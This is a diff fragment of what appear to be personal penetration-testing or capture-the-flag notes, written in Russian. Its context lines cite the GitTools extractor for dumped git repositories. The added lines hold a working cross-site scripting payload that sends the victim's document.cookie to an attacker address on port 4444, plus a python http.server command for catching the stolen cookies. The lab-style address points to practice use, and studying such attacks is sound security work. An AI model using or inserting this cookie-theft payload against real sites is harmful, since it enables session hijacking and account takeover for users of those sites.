@@ -51,3 +51,8 @@ https://github.com/internetwache/GitTools/tree/master/Dumper
 
         ./extractor.sh dump git-ext
         
+# XSS () в уязвимомо месте пишем)
+        
+        <script>document.location='http://10.10.14.252:4444/?c='+document.cookie;</script>
+        и ловим отстук 
+        python3 -m http.server 4444
